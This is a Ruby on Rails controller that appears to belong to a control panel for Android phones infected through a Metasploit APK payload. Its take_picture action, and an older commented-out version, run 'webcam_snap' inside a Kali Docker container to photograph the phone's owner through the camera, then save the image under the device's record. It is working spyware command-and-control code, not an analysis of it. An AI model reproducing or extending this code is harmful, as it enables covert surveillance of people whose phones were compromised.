class PicturesController < InheritedResources::Base
    # def take_picture
    #     require 'date'
    #     current_time = DateTime.now
    #     fileName= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M") + '.jpeg'
    #     if params[:smartphone_id].present?
    #         puts "yees"
    #         @smartphone = Smartphone.find(params[:smartphone_id])
    #         @apk_installation = ApkInstallation.find(@smartphone.apk_installation_id)
    #         @apk_payload = ApkPayload.find(@apk_installation.apk_payload_id)
        
    #         webcaSnapCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/python /root/webcam_snap.py #{@apk_payload.destination_ip} #{@apk_payload.destination_port} 100 1 #{fileName}\""
    #         copyPictureCommand="docker cp kali_container:/#{fileName} files\\pictures\\#{fileName}"

    #         puts webcaSnapCommand
    #         system(webcaSnapCommand)
    #         system(copyPictureCommand)

    #         message=""
    #         fullPath="files\\pictures\\" + fileName
    #         if File.file?(fullPath)
    #             newPicture=Picture.new(:date => '2003-05-03 00:00:00',:filename => fileName, :smartphone_id => @smartphone.id)
    #             newPicture.save!
    #             message="Picture Taken! Path: " + fullPath
    #         else
    #             message="Could not take picture. Please try again.."
    #         end 
    #         redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: @smartphone.id
    #     else
    #         puts "noo"
    #     end
    # end

    #handle no session issue!
    def take_picture
        #puts params[:filename]
        commandTimeout=20
        downloadTimeout=20
        @smartphone = Smartphone.find(params[:smartphone_id])

        currentTime = DateTime.now
        currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
        @fileName= "webcam_snap_" + currentTimeFormat + '.jpeg'
        processCommand="webcam_snap -q 100 -i 1 -p #{@fileName}"
        commandOutput=start_msf_process(processCommand)
        puts commandOutput

        1.upto(commandTimeout) do |n|
            if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
                break
            else
                puts "Waiting ..."
            end
            sleep 1
          end
        copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
        system(copyPictureCommand)

        fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
        isOperationSuccessful=false
        1.upto(downloadTimeout) do |n|
            if File.file?(fullPath)
                newPicture=Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
                newPicture.save!
                isOperationSuccessful = true
                break
            end 
        end
        commandOutput=["Operation Failed"] if not isOperationSuccessful

        respond_to do |format|
            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
          end
    end




  private

    def picture_params
      params.require(:picture).permit(:date, :duration, :filename, :smartphone_id)
    end

end
